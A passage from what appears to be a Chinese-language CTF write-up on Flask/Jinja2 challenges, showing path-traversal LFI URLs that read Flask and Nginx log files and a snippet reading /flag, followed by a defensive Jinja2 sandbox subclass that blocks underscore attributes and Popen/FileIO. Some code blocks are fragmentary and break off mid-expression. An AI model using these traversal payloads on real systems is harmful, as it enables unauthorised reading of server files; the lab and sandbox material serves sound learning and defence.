# 第二步：LFI 读日志
http://target.com/download?file=../../../../var/log/flask.log
```

在日志里搜索 `FLAG_START` 和 `FLAG_END` 之间的内容

- **写进Nginx日志**

```bash

# 然后 LFI 读 access.log
http://target.com/lfi?file=/var/log/nginx/access.log
```

- **写进Flask日志并触发异常**

```python

    "import logging\n"
    "flag=open('/flag').read()\n"

  )
```

### 自定义沙箱策略

```python
from jinja2.sandbox import SandboxedEnvironment

class StrictEnvironment(SandboxedEnvironment):
    def is_safe_attribute(self, obj, attr, value):
        # 禁止所有下划线开头的属性
        if attr.startswith('_'):
            return False
        # 禁止危险类
        if obj.__class__.__name__ in ['Popen', 'FileIO', 'file']:
            return False
        return True

env = StrictEnvironment()
```
